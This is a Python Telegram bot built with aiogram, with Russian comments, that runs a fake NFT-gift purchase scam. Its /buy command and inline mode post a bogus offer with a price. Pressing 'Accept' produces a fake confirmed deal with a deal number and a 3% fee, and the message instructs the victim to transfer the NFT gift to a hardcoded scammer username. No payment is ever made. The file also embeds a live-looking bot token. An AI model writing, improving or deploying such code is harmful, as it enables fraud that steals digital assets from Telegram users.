import asyncio
import re
import random
from aiogram import Bot, Dispatcher, F
from aiogram.types import (Message, CallbackQuery, InlineKeyboardMarkup, 
                           InlineKeyboardButton, InlineQuery, InlineQueryResultArticle, 
                           InputTextMessageContent)
from aiogram.filters import Command

# ================= НАСТРОЙКИ =================
BOT_TOKEN = "9192665034:AAHmJ7MlVOqVpO5IyyXA7BjqiL8jLRNvmog"
TARGET_USERNAME = "@damnationy"  # Твой юзернейм
# ============================================

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

def get_currency_sym(currency):
    c = currency.lower()
    if c in ["stars", "star", "звезды", "звезда"]: 
        return "⭐"
    if c in ["ton", "тон", "тоны"]: 
        return "💎 TON"
    if c in ["usdt", "юсдт"]: 
        return "💵 USDT"
    return c.upper()

def parse_nft_name(nft_link):
    match = re.search(r'nft/([a-zA-Z]+)-(\d+)', nft_link)
    if match:
        name = match.group(1)
        name_spaced = re.sub(r'(?<!^)(?=[A-Z])', ' ', name)
        return f"{name_spaced} #{match.group(2)}"
    return nft_link.split('/')[-1].replace('-', ' #')

# ================= КОМАНДА /buy =================
@dp.message(Command("buy"))
async def fake_buy(message: Message):
    args = message.text.split()
    if len(args) < 3:
        await message.reply("Использование: `/buy <ссылка_на_нфт> <цена> [валюта]`")
        return

    nft_link = args[1]
    price_str = args[2].replace(',', '.')
    try: price = float(price_str)
    except ValueError: return
        
    currency = args[3].lower() if len(args) > 3 else "stars"
    currency_sym = get_currency_sym(currency)
    nft_name = parse_nft_name(nft_link)

    sender_display = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
    
    # Прячем ссылку в данные кнопки!
    callback_accept = f"acc|{price}|{currency}|{nft_link}"

    text = (
        f"<b>Пользователь {sender_display} предлагает Вам\n"
        f"{int(price) if price.is_integer() else price} {currency_sym} за {nft_name}.</b>\n\n"
        f"Предложение действует 24 часа.\n"
        f"{nft_link}"
    )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="❌ Отклонить", callback_data="decline"),
            InlineKeyboardButton(text="✅ Принять", callback_data=callback_accept)
        ]
    ])

    await message.reply(
        text=text,
        reply_markup=keyboard,
        parse_mode="HTML",
        disable_web_page_preview=False
    )

# ================= ИНЛАЙН РЕЖИМ =================
@dp.inline_query()
async def inline_buy(query: InlineQuery):
    try:
        text = query.query.strip()
        if not text: 
            await query.answer(results=[], cache_time=1)
            return

        if text.lower().startswith("/buy"): text = text[4:].strip()
        args = text.split()
        if len(args) < 2: 
            await query.answer(results=[], cache_time=1)
            return

        nft_link = args[0]
        price_str = args[1].replace(',', '.')
        try: price = float(price_str)
        except ValueError: 
            await query.answer(results=[], cache_time=1)
            return
            
        currency = args[2].lower() if len(args) > 2 else "stars"
        currency_sym = get_currency_sym(currency)
        nft_name = parse_nft_name(nft_link)

        sender_display = f"@{query.from_user.username}" if query.from_user.username else query.from_user.first_name
        
        # Прячем ссылку в данные кнопки!
        callback_accept = f"acc|{price}|{currency}|{nft_link}"

        text_to_send = (
            f"<b>Пользователь {sender_display} предлагает Вам\n"
            f"{int(price) if price.is_integer() else price} {currency_sym} за {nft_name}.</b>\n\n"
            f"Предложение действует 24 часа.\n"
            f"{nft_link}"
        )

        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="❌ Отклонить", callback_data="decline"),
                InlineKeyboardButton(text="✅ Принять", callback_data=callback_accept)
            ]
        ])

        result = InlineQueryResultArticle(
            id=str(random.randint(1, 1000000)),
            title=f"Предложить {price} {currency_sym}",
            description=f"За {nft_name}",
            input_message_content=InputTextMessageContent(
                message_text=text_to_send,
                parse_mode="HTML",
                disable_web_page_preview=False
            ),
            reply_markup=keyboard
        )

        await query.answer(results=[result], cache_time=1)

    except Exception as e:
        print(f"ОШИБКА ИНЛАЙНА: {e}")
        try:
            await query.answer(results=[], cache_time=1)
        except:
            pass

# ================= ОБРАБОТКА КНОПОК =================
@dp.callback_query(F.data.in_({"decline"}) | F.data.startswith("acc|"))
async def handle_buttons(callback: CallbackQuery):
    if callback.data == "decline":
        await callback.answer("Отклонено", show_alert=False)
        try: await callback.message.delete()
        except: pass
        return

    if callback.data.startswith("acc|"):
        await callback.answer("✅ Сделка подтверждена", show_alert=False)
        
        try:
            # Разбираем данные из кнопки (теперь там есть и ссылка)
            parts = callback.data.split("|")
            price = float(parts[1])
            currency = parts[2]
            nft_link = parts[3] if len(parts) > 3 else "https://t.me/nft"
            
            currency_sym = get_currency_sym(currency)
            nft_name = parse_nft_name(nft_link)
            
            final_price = round(price - (price * 0.03), 2)
            final_price_display = int(final_price) if final_price.is_integer() else final_price
            deal_id = random.randint(10000, 99999)

            new_text = (
                f"✅ <b>Сделка #{deal_id} подтверждена.</b>\n\n"
                f"Подарок <b>{nft_name}</b> зарезервирован. Чтобы получить <b>{final_price_display} {currency_sym}</b> <i>(с учетом комиссии 3%)</i>, передайте его покупателю <b>{TARGET_USERNAME}</b>.\n\n"
                f"<b>1.</b> Откройте <b>Профиль → Подарки</b>.\n"
                f"<b>2.</b> Выберите <b>{nft_name}</b>.\n"
                f"<b>3.</b> Нажмите <b>«Передать»</b> и укажите получателя <b>{TARGET_USERNAME}</b>.\n\n"
                f"{nft_link}"
            )

            new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Как передать", callback_data="how_to")],
                [InlineKeyboardButton(text="Confirm Transfer", callback_data="confirm_transfer")]
            ])

            # Если сообщение в чате (ЛС или группа, где бот админ)
            if callback.message:
                try:
                    await callback.message.edit_text(
                        text=new_text, 
                        reply_markup=new_keyboard, 
                        parse_mode="HTML", 
                        disable_web_page_preview=False
                    )
                except Exception:
                    # Если это фото, меняем подпись
                    await callback.message.edit_caption(
                        caption=new_text, 
                        reply_markup=new_keyboard, 
                        parse_mode="HTML"
                    )
            else:
                # Если это инлайн-сообщение в чужом чате
                await callback.bot.edit_message_text(
                    inline_message_id=callback.inline_message_id,
                    text=new_text, 
                    reply_markup=new_keyboard, 
                    parse_mode="HTML", 
                    disable_web_page_preview=False
                )
                
        except Exception as e:
            print(f"ОШИБКА КНОПКИ: {e}")

@dp.callback_query(F.data == "how_to")
async def handle_how_to(callback: CallbackQuery):
    await callback.answer("Откройте профиль -> Подарки, выберите NFT и нажмите 'Передать'.", show_alert=True)

@dp.callback_query(F.data == "confirm_transfer")
async def handle_confirm(callback: CallbackQuery):
    await callback.answer("Ожидание перевода...", show_alert=True)

async def main():
    print("Бот запущен!")
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())